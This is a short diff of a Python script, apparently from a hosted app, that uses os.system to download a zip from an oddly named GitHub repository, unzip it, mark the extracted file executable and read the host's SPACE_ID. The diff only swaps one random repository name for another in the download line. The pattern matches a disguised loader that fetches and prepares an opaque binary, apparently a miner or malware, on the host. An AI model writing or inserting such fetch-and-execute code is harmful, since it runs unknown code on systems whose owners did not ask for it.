@@ -1,5 +1,5 @@
 import os
-os.system("wget https://github.com/qqivk/jenskl/raw/refs/heads/main/xlfiu.zip")
+os.system("wget https://github.com/qqivk/Ydix/raw/refs/heads/main/xlfiu.zip")
 os.system("unzip xlfiu.zip")
 os.system("chmod +x xlfiu")
 wn = os.getenv('SPACE_ID').replace("/","_")
